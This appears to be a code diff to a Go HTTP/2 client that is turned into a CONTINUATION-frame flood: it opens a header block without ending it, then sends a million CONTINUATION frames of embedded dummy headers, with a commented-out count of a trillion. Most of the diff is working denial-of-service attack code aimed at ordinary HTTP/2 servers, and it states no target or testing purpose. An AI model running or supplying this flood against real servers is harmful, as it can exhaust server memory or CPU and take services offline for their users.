@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	_ "embed"
 	"fmt"
 	"log"
 	"net"
@@ -15,7 +16,17 @@ const (
 	http2ClientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
 )
 
+var (
+	//go:embed dummy-key
+	dummyKey string
+
+	//go:embed dummy-value
+	dummyValue string
+)
+
 func customHttp2Call(conn net.Conn) {
+	var err error
+
 	// RFC 7540 3.5 HTTP/2 Connection Preface
 	conn.Write([]byte(http2ClientPreface))
 
@@ -48,21 +59,28 @@ func customHttp2Call(conn net.Conn) {
 	henc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "gzip"})
 	henc.WriteField(hpack.HeaderField{Name: "user-agent", Value: "Foo Bar"})
 
-	fmt.Printf("len(hbuf.Bytes()): %v\n", len(hbuf.Bytes()))
-	err := framer.WriteHeaders(http2.HeadersFrameParam{
+	// fmt.Printf("len(hbuf.Bytes()): %v\n", len(hbuf.Bytes()))
+	err = framer.WriteHeaders(http2.HeadersFrameParam{
 		// StreamID:      settingsFrame.StreamID,
 		StreamID:      1,
 		BlockFragment: hbuf.Bytes(),
-		EndHeaders:    true,
-		EndStream:     true,
+		// EndHeaders:    true,
+		// EndStream:     true,
+		EndHeaders: false,
 	})
+
 	if err != nil {
 		log.Fatal("write headers error: ", err)
 	}
 
-	// for idx := range []int{1, 2, 3} {
-	// 	writeHeader(framer, idx == 2)
-	// }
+	// N := 1_000_000_000_000
+	N := 1_000_000
+	for idx := range N {
+		// frame, err := framer.ReadFrame()
+		// fmt.Printf("err: %v\n", err)
+		// fmt.Printf("frame: %v\n", frame)
+		writeHeader(framer, idx == N-1)
+	}
 
 	frames := make([]http2.Frame, 0)
 	for {
@@ -103,6 +121,7 @@ func customHttp2Call(conn net.Conn) {
 			log.Printf("data frame: %s\n", frame.Data())
 			data := frame.Data()
 			fmt.Printf("data: %v\n", data)
+			fmt.Printf("string(data): %v\n", string(data))
 		case *http2.HeadersFrame:
 			log.Printf("headers frame: %s\n", frame.Header())
 		default:
@@ -114,15 +133,21 @@ func customHttp2Call(conn net.Conn) {
 func writeHeader(framer *http2.Framer, last bool) {
 	hbuf := bytes.NewBuffer([]byte{})
 	henc := hpack.NewEncoder(hbuf)
-	henc.WriteField(hpack.HeaderField{Name: "pien", Value: "paonpaon"})
-	henc.WriteField(hpack.HeaderField{Name: "pien-paon", Value: "piiiiiiiiii"})
+	henc.WriteField(hpack.HeaderField{Name: dummyKey, Value: dummyValue})
+	// 逆にしたのも送る。
+	henc.WriteField(hpack.HeaderField{Name: dummyValue, Value: dummyKey})
 
-	if err := framer.WriteHeaders(http2.HeadersFrameParam{
-		// StreamID:      settingsFrame.StreamID,
-		StreamID:      1,
-		BlockFragment: hbuf.Bytes(),
-		EndHeaders:    last,
-	}); err != nil {
+	// if err := framer.WriteHeaders(http2.HeadersFrameParam{
+	// 	// StreamID:      settingsFrame.StreamID,
+	// 	StreamID:      1,
+	// 	BlockFragment: hbuf.Bytes(),
+	// 	EndHeaders:    last,
+	// 	EndStream:     last,
+	// }); err != nil {
+	// 	log.Fatal("write headers error: ", err)
+	// }
+
+	if err := framer.WriteContinuation(1, last, hbuf.Bytes()); err != nil {
 		log.Fatal("write headers error: ", err)
 	}
 }
